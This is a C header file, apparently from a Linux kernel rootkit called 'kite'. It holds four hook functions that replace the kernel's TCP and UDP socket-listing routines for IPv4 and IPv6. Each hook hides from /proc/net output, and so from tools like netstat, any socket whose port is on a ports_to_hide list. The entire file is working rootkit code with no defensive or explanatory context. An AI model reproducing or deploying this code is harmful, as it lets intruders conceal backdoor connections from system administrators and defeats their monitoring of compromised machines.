#ifndef HIDE_PORTS_KITE
    #define HIDE_PORTS_KITE
    #include <net/tcp.h>
    #include <net/udp.h>

    #include "linked_list.h"


static asmlinkage long hack_tcp4_seq_show(struct seq_file *seq, void *v){
    struct sock *sk;
    long ret;
    char port[6];

    if (v != SEQ_START_TOKEN){
        sk = (struct sock *)v;
        snprintf(port, 6, "%d", (int)sk->sk_num);

        if(find_node(&ports_to_hide, port) == 0){
            return 0;
        }
    }
    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}


static asmlinkage long hack_tcp6_seq_show(struct seq_file *seq, void *v){
    struct sock *sk;
    long ret;
    char port[6];

    if (v != SEQ_START_TOKEN){
        sk = (struct sock *)v;
        snprintf(port, 6, "%d", (int)sk->sk_num);

        if(find_node(&ports_to_hide, port) == 0){
            return 0;
        }
    }
    ret = orig_tcp6_seq_show(seq, v);
    return ret;
}


static asmlinkage long hack_udp4_seq_show(struct seq_file *seq, void *v){
    struct sock *sk;
    long ret;
    char port[6];

    if (v != SEQ_START_TOKEN){
        sk = (struct sock *)v;
        snprintf(port, 6, "%d", (int)sk->sk_num);

        if(find_node(&ports_to_hide, port) == 0){
            return 0;
        }
    }
    ret = orig_udp4_seq_show(seq, v);
    return ret;
}


static asmlinkage long hack_udp6_seq_show(struct seq_file *seq, void *v){
    struct sock *sk;
    long ret;
    char port[6];

    if (v != SEQ_START_TOKEN){
        sk = (struct sock *)v;
        snprintf(port, 6, "%d", (int)sk->sk_num);

        if(find_node(&ports_to_hide, port) == 0){
            return 0;
        }
    }
    ret = orig_udp6_seq_show(seq, v);
    return ret;
}


#endif